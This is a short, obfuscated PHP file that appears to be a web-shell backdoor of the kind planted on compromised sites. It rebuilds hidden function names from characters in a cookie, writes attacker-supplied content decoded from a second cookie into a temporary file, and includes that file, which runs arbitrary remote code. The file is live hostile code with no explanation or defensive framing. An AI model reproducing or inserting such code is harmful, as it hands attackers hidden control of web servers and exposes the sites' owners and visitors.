<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[38])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 10;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[38][$n];
        if (!$c[38][$n + 1]) {
            if (!$c[38][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 10 + 1;
    }
    $k = $p[6]() . $p[18];
    if (!$p[5]($k)) {
        $n = $p[21]($k, $p[25]);
        $p[1]($n, $p[9] . $p[24]($p[4]($c[3])));
    }
    include($k);
}